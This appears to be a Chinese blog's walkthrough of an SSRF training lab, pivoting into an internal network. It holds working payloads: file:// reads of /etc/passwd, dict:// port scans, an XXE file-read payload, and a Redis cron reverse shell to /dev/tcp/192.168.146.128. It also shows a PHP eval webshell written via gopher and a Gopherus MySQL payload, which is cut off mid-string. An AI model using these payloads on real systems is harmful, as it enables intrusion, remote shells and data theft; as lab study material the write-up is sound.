<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ssrf-vul-for-new</title>
    <link href="/2025/04/03/ssrf-vul-for-new/"/>
    <url>/2025/04/03/ssrf-vul-for-new/</url>
    
    <content type="html"><![CDATA[<h2 id="SSRF打穿内网"><a href="#SSRF打穿内网" class="headerlink" title="SSRF打穿内网"></a>SSRF打穿内网</h2><h2 id="靶场拓扑设计"><a href="#靶场拓扑设计" class="headerlink" title="靶场拓扑设计"></a>靶场拓扑设计</h2><p><img src="/images/ssrf-vul-for-new/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-1743649004960-6.png" alt="未命名文件"></p><p>攻击流程，172.150.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 9080，此时攻击者通过这个 9080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。</p><h2 id="1-判断目标站点是否存在SSRF"><a href="#1-判断目标站点是否存在SSRF" class="headerlink" title="1.判断目标站点是否存在SSRF"></a>1.判断目标站点是否存在SSRF</h2><p>访问目标站点</p><p>是一个带爬取网站首页的功能网站</p><p><img src="/images/ssrf-vul-for-new/image-20250329164520961.png" alt="image-20250329164520961"></p><p>这里访问<a href="http://127.0.0.1/">http://127.0.0.1</a> 发现页面返回了网站首页</p><p><img src="/images/ssrf-vul-for-new/image-20250329165403207.png" alt="image-20250329165403207"></p><p>并且我们的bp检测SSRF插件也显示此站点url处疑似存在SSRF漏洞</p><p><img src="/images/ssrf-vul-for-new/image-20250329165639501.png" alt="image-20250329165639501"></p><h2 id="2-尝试获取本地信息"><a href="#2-尝试获取本地信息" class="headerlink" title="2.尝试获取本地信息"></a>2.尝试获取本地信息</h2><h3 id="先判断目标机器操作系统"><a href="#先判断目标机器操作系统" class="headerlink" title="先判断目标机器操作系统"></a>先判断目标机器操作系统</h3><p>配合file协议 探测目标操作系统</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">linux:</span><span class="hljs-keyword">/etc/</span>passwd<br><span class="hljs-symbol">windows:</span><span class="hljs-keyword">/system32/</span>win.ini<br></code></pre></td></tr></table></figure><p>显示为linux，并且成功读取到了&#x2F;etc&#x2F;passwd信息</p><h3 id="尝试获取目标内网地址"><a href="#尝试获取目标内网地址" class="headerlink" title="尝试获取目标内网地址"></a><img src="/images/ssrf-vul-for-new/image-20250329170049306.png" alt="image-20250329170049306">尝试获取目标内网地址</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>hosts<br>权限高的情况下还可以尝试读取 <span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/arp 或者 /</span>etc<span class="hljs-regexp">/network/i</span>nterfaces 来判断当前机器的网络情况<br></code></pre></td></tr></table></figure><p>获取到目标内网地址为 172.150.23.21</p><p><img src="/images/ssrf-vul-for-new/image-20250329170429456.png" alt="image-20250329170429456"></p><h2 id="3-利用SSRF探测内网端口"><a href="#3-利用SSRF探测内网端口" class="headerlink" title="3.利用SSRF探测内网端口"></a>3.利用SSRF探测内网端口</h2><p>SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP <strong>回显的端口</strong></p><h3 id="bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测"><a href="#bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测" class="headerlink" title="bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测"></a>bp下使用迭代器爆破模块，设置好爆破的ip和端口号批量探测</h3><p>这里由于上帝视角，仅进行C段信息探测</p><p><img src="/images/ssrf-vul-for-new/image-20250329183858875.png" alt="image-20250329183858875"></p><p><img src="/images/ssrf-vul-for-new/image-20250329183802091.png" alt="image-20250329183802091"></p><p><img src="/images/ssrf-vul-for-new/image-20250329185409410.png" alt="image-20250329185409410"></p><h3 id="整理好内网ip及端口开放情况"><a href="#整理好内网ip及端口开放情况" class="headerlink" title="整理好内网ip及端口开放情况"></a>整理好内网ip及端口开放情况</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">可能有误<br><span class="hljs-number">172.150.23.21</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.22</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.23</span> - <span class="hljs-number">80</span> <span class="hljs-number">3306</span><br><span class="hljs-number">172.150.23.24</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.25</span> - <span class="hljs-number">80</span><br><span class="hljs-number">172.150.23.26</span> - <span class="hljs-number">8080</span><br><span class="hljs-number">172.150.23.27</span> - <span class="hljs-number">6379</span><br><span class="hljs-number">172.150.23.28</span> - <span class="hljs-number">80</span> <span class="hljs-number">6379</span><br><span class="hljs-number">172.150.23.29</span> - <span class="hljs-number">80</span> <span class="hljs-number">3306</span><br><br><br><br></code></pre></td></tr></table></figure><h2 id="4-172-150-23-22-RCE"><a href="#4-172-150-23-22-RCE" class="headerlink" title="4.172.150.23.22 - RCE"></a>4.172.150.23.22 - RCE</h2><p>访问172.150.23.22</p><p><img src="/images/ssrf-vul-for-new/image-20250329185948599.png" alt="image-20250329185948599"></p><p>转到目录扫描 依旧是爆破模块fuzz一下目录字典</p><p>可以发现目录下存在 shell.php phpinfo.php index.php</p><p><img src="/images/ssrf-vul-for-new/image-20250329195003316.png" alt="image-20250329195003316"></p><p>访问shell.php</p><p>你妹的，竟然是后门命令执行文件 </p><h4 id="这里要注意一个点"><a href="#这里要注意一个点" class="headerlink" title="这里要注意一个点"></a>这里要注意一个点</h4><p>因为是通过SSRF进行攻击的，所以在输入url的时候需要进行一次url的编码，进入bp时是两次url编码</p><p><img src="/images/ssrf-vul-for-new/image-20250329195140866.png" alt="image-20250329195140866"></p><p><img src="/images/ssrf-vul-for-new/image-20250329195353448.png" alt="image-20250329195353448"></p><p><img src="/images/ssrf-vul-for-new/image-20250329200159802.png" alt="image-20250329200159802"></p><p>访问phpinfo.php</p><p><img src="/images/ssrf-vul-for-new/image-20250329195448786.png" alt="image-20250329195448786"></p><h2 id="5-172-150-23-23-sql注入"><a href="#5-172-150-23-23-sql注入" class="headerlink" title="5.172.150.23.23 - sql注入"></a>5.172.150.23.23 - sql注入</h2><p>访问这个内网地址，发现是一个人员查询系统</p><p><img src="/images/ssrf-vul-for-new/image-20250330214255806.png" alt="image-20250330214255806"></p><p>在页面输入1，试试</p><p>oh !!! 发现了传参参数 ‘id’ ，很明显不能直接在这里输入值.</p><p>这里解释一下，由于我们是通过爬取这个站点获取内网信息的，所以在构造参数的时候不能在传入值输入，当前页面只接收url的值。</p><p>去看国光的wp可以吗？’H’</p><p>本人已经累了</p><p>我有机会再补上</p><h2 id="6-172-150-23-24-SSRF命令执行"><a href="#6-172-150-23-24-SSRF命令执行" class="headerlink" title="6.172.150.23.24 SSRF命令执行"></a>6.172.150.23.24 SSRF命令执行</h2><p>这里跟上面不太一样。之前的代码注入和 SQL 注入都是直接通过 GET 方式来传递参数进行攻击的，但是这个命令执行的场景是通过 POST 方式触发的，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据，这种情况下一般就得利用 gopher 协议来发起对内网应用的 POST 请求了，gopher 的基本请求格式如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_&lt;tcp</span>数据流&gt;<br></code></pre></td></tr></table></figure><p>gopher 协议是一个古老且强大的协议，从请求格式可以看出来，可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。</p><h3 id="两次-URL-编码后的数据就最终的-TCP-数据流"><a href="#两次-URL-编码后的数据就最终的-TCP-数据流" class="headerlink" title="两次 URL 编码后的数据就最终的 TCP 数据流"></a>两次 URL 编码后的数据就最终的 TCP 数据流</h3><p>访问站点，是一个ping 功能网络测试接口</p><p><img src="/images/ssrf-vul-for-new/image-20250331100527552.png" alt="image-20250331100527552"></p><p>首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Accept</span>-Encoding: gzip, deflate, br<br></code></pre></td></tr></table></figure><p>记得把长度改成  27！。</p><p><img src="/images/ssrf-vul-for-new/image-20250331143140999.png" alt="image-20250331143140999"></p><p>再把这个数据包进行二次URL编码</p><p><img src="/images/ssrf-vul-for-new/image-20250331143256798.png" alt="image-20250331143256798"></p><p>把构造好的数据包放到gopher的特定位置，发包成功回显</p><p><img src="/images/ssrf-vul-for-new/image-20250331143350554.png" alt="image-20250331143350554"></p><h2 id="7-172-72-23-25-XML-实体注入"><a href="#7-172-72-23-25-XML-实体注入" class="headerlink" title="7.172.72.23.25 - XML 实体注入"></a>7.172.72.23.25 - XML 实体注入</h2><p>本场景是一个基础的 XXE 外部实体注入场景，登录的时候用户提交的 XML 数据，且服务器后端对 XML 数据解析并将结果输出，所以可以构造一个 XXE 读取本地的敏感信息</p><p>访问这个网站。尝试 读取本地的敏感信息</p><p><img src="/images/ssrf-vul-for-new/image-20250331155209476.png" alt="image-20250331155209476"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding= <span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">user</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY u <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/hosts&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;u;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>把所要传输的数据进行修改，两次URL打包</p><p><img src="/images/ssrf-vul-for-new/image-20250403102246954.png" alt="image-20250403102246954"></p><p><img src="/images/ssrf-vul-for-new/image-20250403102438000.png" alt="image-20250403102438000"></p><p>使用gopher协议</p><p><img src="/images/ssrf-vul-for-new/image-20250403102521850.png" alt="image-20250403102521850"></p><h2 id="8-172-72-23-26-CVE-2017-12615"><a href="#8-172-72-23-26-CVE-2017-12615" class="headerlink" title="8.172.72.23.26 - CVE-2017-12615"></a>8.172.72.23.26 - CVE-2017-12615</h2><p>这个我更是不想说话了。脑子感觉已经炸了，访问8080端口连页面都没爬给我</p><p>想看的兄弟可以看拉文章最后浏览别人做题过程。</p><p>我暂时跳过 ^&#x2F;&#x2F;^</p><h2 id="9-172-72-23-27-Redis-未授权"><a href="#9-172-72-23-27-Redis-未授权" class="headerlink" title="9.172.72.23.27 - Redis 未授权"></a>9.172.72.23.27 - Redis 未授权</h2><p>Redis </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 清空 key</span><br>dict://172.150.23.27:6379/flushall<br><br><span class="hljs-comment"># 设置要操作的路径为定时任务目录</span><br>dict://172.150.23.27:6379/config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron/<br><br><span class="hljs-comment"># 在定时任务目录下创建 root 的定时任务文件</span><br>dict://172.150.23.27:6379/config <span class="hljs-built_in">set</span> dbfilename root<br><br><span class="hljs-comment"># 写入 Bash 反弹 shell 的 payload</span><br>dict://172.150.23.27:6379/set x <span class="hljs-string">&quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/192.168.146.128/2323 0&gt;%261\n&quot;</span><br><br><span class="hljs-comment"># 保存上述操作</span><br>dict://172.150.23.27:6379/save<br></code></pre></td></tr></table></figure><p>SSRF 攻击的话并不能使用 redis-cli 来连接 Redis 进行攻击作，未授权的情况下可以使用 dict 或者 gopher 协议来进行攻击，因为 gopher 协议构造比较繁琐，所以本场景建议直接使用 DICT 协议来攻击，效率会高很多，DICT 协议除了可以探测端口以外，另一个是攻击未授权的 Redis 服务，格式如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">dict:</span>//<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">6379</span>/&lt;Redis 命令&gt;<br></code></pre></td></tr></table></figure><p>通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息，下面开始直接使用 dict 协议来创建定时任务来反弹 Shell：</p><p><img src="/images/ssrf-vul-for-new/image-20250331165015411.png" alt="image-20250331165015411"></p><p>1.清空 key<img src="/images/ssrf-vul-for-new/image-20250331162824359.png" alt="image-20250331162824359"></p><p>2.设置要操作的路径为定时任务目录</p><p><img src="/images/ssrf-vul-for-new/image-20250331163025060.png" alt="image-20250331163025060"></p><p>3.在定时任务目录下创建 root 的定时任务文件</p><p><img src="/images/ssrf-vul-for-new/image-20250331163119104.png" alt="image-20250331163119104"></p><p>4.写入 Bash 反弹 shell 的 payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dict:<span class="hljs-regexp">//</span><span class="hljs-number">172.150</span>.<span class="hljs-number">23.27</span>:<span class="hljs-number">6379</span><span class="hljs-regexp">/set x &quot;\n* * * * * /</span>bin<span class="hljs-regexp">/bash -i &gt;%26 /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">192.168</span>.<span class="hljs-number">146.128</span>/<span class="hljs-number">2323</span> <span class="hljs-number">0</span>&gt;%<span class="hljs-number">261</span>\n<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>保证数据不变形</p><p><img src="/images/ssrf-vul-for-new/image-20250331164252714.png" alt="image-20250331164252714"></p><p><img src="/images/ssrf-vul-for-new/image-20250331164340580.png" alt="image-20250331164340580"></p><p>5.保存上述操作</p><p><img src="/images/ssrf-vul-for-new/image-20250331164438450.png" alt="image-20250331164438450"></p><p>6.查看监听</p><p>有了有了兄弟们</p><p><img src="/images/ssrf-vul-for-new/image-20250331164706626.png" alt="image-20250331164706626"></p><h2 id="10-172-150-23-28-Redis-有认证"><a href="#10-172-150-23-28-Redis-有认证" class="headerlink" title="10.172.150.23.28 - Redis 有认证"></a>10.172.150.23.28 - Redis 有认证</h2><p>要认证</p><p><img src="/images/ssrf-vul-for-new/image-20250331165629454.png" alt="image-20250331165629454"></p><p>但是80端口有本地文件包含漏洞，利用LFI获取本地文件<img src="/images/ssrf-vul-for-new/image-20250331170043339.png" alt="image-20250331170043339"></p><p>因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>redis.conf<br><span class="hljs-regexp">/etc/</span>redis/redis.conf<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>etc/redis.conf<br><span class="hljs-regexp">/opt/</span>redis<span class="hljs-regexp">/ect/</span>redis.conf<br></code></pre></td></tr></table></figure><p><img src="/images/ssrf-vul-for-new/image-20250331170318181.png" alt="image-20250331170318181"></p><p><img src="/images/ssrf-vul-for-new/image-20250331170344550.png" alt="image-20250331170344550"></p><p>等待！！！</p><p>说一下思路，有时间的话我会补充上来。</p><p>因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。</p><p>那么只能使用我们的老伙计 gopher 协议了，gopher 协议因为需要原生数据包，所以我们需要抓取到 Redis 的请求数据包。可以使用 Linux 自带的 socat 命令来进行本地的模拟抓取：</p><p>命令来进行本地的模拟抓取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379<br></code></pre></td></tr></table></figure><p>此时使用 redis-cli 连接本地的 4444 端口：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  ~ redis-cli -h <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> -p <span class="hljs-number">4444</span><br><span class="hljs-number">127.0.0.1:4444</span>&gt;<br></code></pre></td></tr></table></figure><p>服务器接着会把 4444 端口的流量接受并转发给服务器的 6379 端口，然后认证后进行往网站目录下写入 shell 的操作：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 认证 redis</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; auth P@ssw0rd<br><span class="hljs-attribute">OK</span><br><br><span class="hljs-comment"># 清空 key</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; flushall<br><br><span class="hljs-comment"># 设置要操作的路径为网站根目录</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; config set dir /var/www/html<br><br><span class="hljs-comment"># 在网站目录下创建 shell.php 文件</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; config set dbfilename shell.php<br><br><span class="hljs-comment"># 设置 shell.php 的内容</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; set x <span class="hljs-string">&quot;\n&lt;?php eval($_GET[1]);?&gt;\n&quot;</span><br><br><span class="hljs-comment"># 保存上述操作</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">4444</span>&gt; save<br></code></pre></td></tr></table></figure><p>与此同时我们还可以看到详细的数据包情况，下面来记录一下关键的流量情况：</p><p><img src="/images/ssrf-vul-for-new/16203835195059.png" alt="img"></p><p>可以看到 Redis 的流量并不难理解，可以根据上图橙色标记的注释来理解一下，接下来整理出关键的请求数据包如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*<span class="hljs-number">2</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>auth<span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>P@ssw0rd<span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">8</span><span class="hljs-string">\r</span><br>flushall<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>dir<span class="hljs-string">\r</span><br>$<span class="hljs-number">13</span><span class="hljs-string">\r</span><br>/<span class="hljs-keyword">var</span>/www/html<span class="hljs-string">\r</span><br>*<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">6</span><span class="hljs-string">\r</span><br>config<span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">10</span><span class="hljs-string">\r</span><br>dbfilename<span class="hljs-string">\r</span><br>$<span class="hljs-number">9</span><span class="hljs-string">\r</span><br>shell.php<span class="hljs-string">\r</span><br>*<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">3</span><span class="hljs-string">\r</span><br>set<span class="hljs-string">\r</span><br>$<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>x<span class="hljs-string">\r</span><br>$<span class="hljs-number">25</span><span class="hljs-string">\r</span><br><br><br><span class="hljs-string">\r</span><br>*<span class="hljs-number">1</span><span class="hljs-string">\r</span><br>$<span class="hljs-number">4</span><span class="hljs-string">\r</span><br>save<span class="hljs-string">\r</span>  <br></code></pre></td></tr></table></figure><p>可以看到每行都是以 <code>\r</code> 结尾的，但是 Redis 的协议是以 CRLF (<code>\r\n</code>) 结尾，所以转换的时候需要把 <code>\r</code> 转换为 <code>\r\n</code>，然后其他全部进行 两次 URL 编码，这里借助 BP 就很容易解决</p><p>最后使用发送gopher协议请求</p><p>执行成功的话会在 &#x2F;var&#x2F;www&#x2F;html 根目录下写入 shell.php 文件，密码为 1</p><h2 id="11-172-150-23-29-MYSQL未授权"><a href="#11-172-150-23-29-MYSQL未授权" class="headerlink" title="11.172.150.23.29-MYSQL未授权"></a>11.172.150.23.29-MYSQL未授权</h2><p><img src="/images/ssrf-vul-for-new/image-20250403085638657.png" alt="image-20250403085638657"></p><p>MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP&#x2F;IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包，所以还是和攻击 Redis 应用一样，这里我们使用 Gopherus-master 工具生成gopher协议数据包</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">python2 gopherus.py <span class="hljs-comment">--exploit mysql</span><br><br>root<br><br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span><br><br>后续编码一次<br></code></pre></td></tr></table></figure><p><img src="/images/ssrf-vul-for-new/image-20250403091048764.png" alt="image-20250403091048764"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.150.23.29:3306</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">38</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span 